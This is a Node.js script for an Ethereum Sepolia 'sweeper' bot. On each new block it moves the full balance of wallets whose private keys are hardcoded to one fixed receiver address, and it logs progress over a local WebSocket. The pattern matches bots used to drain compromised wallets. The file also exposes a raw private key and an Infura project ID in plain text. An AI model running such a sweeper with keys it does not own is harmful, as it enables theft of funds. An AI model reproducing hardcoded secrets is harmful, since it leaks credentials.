const ethers = require("ethers");
const WebSocket = require("ws");

const provider = new ethers.providers.WebSocketProvider(
  "wss://sepolia.infura.io/ws/v3/da7be54859904a0d92cc4b8c8b69ac90"
);

const addressReceiver = "0x501a9E31877F562D0b66F79747E0d09A7E62fa36";

const privateKeys = [
  "217055364ea51620a1562be3a1512f91474faebd17902a0f7c313cb6139558d0",
];

// Create a WebSocket server
const wss = new WebSocket.Server({ port: 8080 });

wss.on("connection", function connection(ws) {
  console.log("WebSocket client connected");

  function sendMessage(message) {
    try {
      ws.send(JSON.stringify(message));
    } catch (error) {
      console.error("Error sending message to WebSocket client:", error);
    }
  }

  // Call the bot function
  bot(sendMessage);
});

const bot = async (sendMessage) => {
  try {
    provider.on("block", async () => {
      try {
        console.log("Listening to new block, waiting ;)");
        sendMessage({
          type: "log",
          message: "Listening to new block, waiting ;)",
        });

        for (let i = 0; i < privateKeys.length; i++) {
          const privateKey = privateKeys[i];
          const wallet = new ethers.Wallet(privateKey, provider);
          const balance = await provider.getBalance(wallet.address);
          console.log("addressReceiver", addressReceiver);
          sendMessage({
            type: "log",
            message: `Receiver address: ${addressReceiver}`,
          });
          
          console.log("Balance:", ethers.utils.formatEther(balance));
          sendMessage({
            type: "log",
            message: `Balance: ${ethers.utils.formatEther(balance)}`,
          });

          const gasPrice = await provider.getGasPrice();
          const gasLimit = await wallet.estimateGas({
            to: addressReceiver,
            value: balance,
          });
          console.log(gasLimit);

          const totalGasCost = gasLimit.mul(gasPrice);
          console.log(totalGasCost);

          if (balance.sub(totalGasCost) > 0) {

            sendMessage({
              type: "log",
              message: "New Account with Eth!",
            });
            console.log("New Account with Eth!");

            const amount = balance.sub(totalGasCost);

            try {
              const tx = await wallet.sendTransaction({
                to: addressReceiver,
                value: amount,
                chainId: 11155111,
                gasPrice,
                gasLimit,
              });

              await tx.wait(); // Wait for transaction confirmation
              console.log(
                `Success! transferred ${ethers.utils.formatEther(amount)} ETH`
              );

              // Send log message to WebSocket client
              sendMessage({
                type: "log",
                message: `Success! transferred ${ethers.utils.formatEther(
                  amount
                )} ETH`,
              });
            } catch (e) {
              console.log(`Error: ${e}`);

              // Send error message to WebSocket client
              sendMessage({ type: "error", message: `Error: ${e}` });
            }
          }
        }
      } catch (err) {
        console.error(err);

        // Send error message to WebSocket client
        sendMessage({ type: "error", message: `Error: ${err}` });
      }
    });
  } catch (err) {
    console.error(err);

    // Send error message to WebSocket client
    sendMessage({ type: "error", message: `Error: ${err}` });
  }
};

module.exports = bot;
